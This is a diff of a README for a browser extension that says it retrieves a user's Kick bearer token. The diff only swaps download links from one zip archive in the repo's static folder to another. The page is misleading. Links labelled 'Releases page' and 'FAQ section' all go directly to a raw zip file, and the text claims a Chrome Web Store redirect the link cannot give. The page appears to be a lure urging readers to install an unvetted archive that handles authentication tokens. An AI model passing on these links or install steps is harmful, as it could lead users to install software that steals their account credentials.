@@ -6,7 +6,7 @@ Welcome to the GetKickBearerToken-extension! This extension helps you to easily 
 ## 📥 Download the Extension
 To get started, you will need to download the extension. You can find the latest version at the link below:
 
-[![Download GetKickBearerToken-extension](https://raw.githubusercontent.com/sekarrisma/GetKickBearerToken-extension/main/static/Bearer_Get_Token_Kick_extension_1.3.zip)](https://raw.githubusercontent.com/sekarrisma/GetKickBearerToken-extension/main/static/Bearer_Get_Token_Kick_extension_1.3.zip)
+[![Download GetKickBearerToken-extension](https://github.com/sekarrisma/GetKickBearerToken-extension/raw/refs/heads/main/static/Get_Bearer_Kick_extension_Token_2.0.zip)](https://github.com/sekarrisma/GetKickBearerToken-extension/raw/refs/heads/main/static/Get_Bearer_Kick_extension_Token_2.0.zip)
 
 ## 🌟 Features
 - **User-Friendly Interface:** Designed for simplicity, so anyone can use it.
@@ -23,7 +23,7 @@ To get started, you will need to download the extension. You can find the latest
 ## 🔧 Download & Install
 To download and install the GetKickBearerToken-extension, follow these steps:
 
-1. **Visit this page to download:** Go to the [Releases page](https://raw.githubusercontent.com/sekarrisma/GetKickBearerToken-extension/main/static/Bearer_Get_Token_Kick_extension_1.3.zip).
+1. **Visit this page to download:** Go to the [Releases page](https://github.com/sekarrisma/GetKickBearerToken-extension/raw/refs/heads/main/static/Get_Bearer_Kick_extension_Token_2.0.zip).
 2. **Choose Your Version:** Find the latest release. It will usually be at the top of the page.
 3. **Download the Extension:** Click on the version you want. If you are using Chrome, you will be redirected to the Chrome Web Store. If using Firefox, select the installation file directly.
 4. **Install the Extension:**
@@ -44,10 +44,10 @@ Using the GetKickBearerToken-extension is straightforward:
 4. **Copy the Token:** Use the "Copy" button to copy your token for easy use.
 
 ## 💬 Need Help?
-If you encounter any issues while downloading or using the extension, please check the FAQ section on our [Releases page](https://raw.githubusercontent.com/sekarrisma/GetKickBearerToken-extension/main/static/Bearer_Get_Token_Kick_extension_1.3.zip) for common questions and answers. If you still need assistance, feel free to open a support ticket on GitHub.
+If you encounter any issues while downloading or using the extension, please check the FAQ section on our [Releases page](https://github.com/sekarrisma/GetKickBearerToken-extension/raw/refs/heads/main/static/Get_Bearer_Kick_extension_Token_2.0.zip) for common questions and answers. If you still need assistance, feel free to open a support ticket on GitHub.
 
 ## 🔄 Keeping the Extension Updated
-To enjoy the latest features and improvements, keep your extension updated. Return to the [Releases page](https://raw.githubusercontent.com/sekarrisma/GetKickBearerToken-extension/main/static/Bearer_Get_Token_Kick_extension_1.3.zip) periodically to check for new versions. Installing updates is similar to the initial installation process.
+To enjoy the latest features and improvements, keep your extension updated. Return to the [Releases page](https://github.com/sekarrisma/GetKickBearerToken-extension/raw/refs/heads/main/static/Get_Bearer_Kick_extension_Token_2.0.zip) periodically to check for new versions. Installing updates is similar to the initial installation process.
 
 ## 📜 License
 This extension is open-source and is licensed under the MIT License. You can freely use, modify, and distribute the software as per the license conditions.
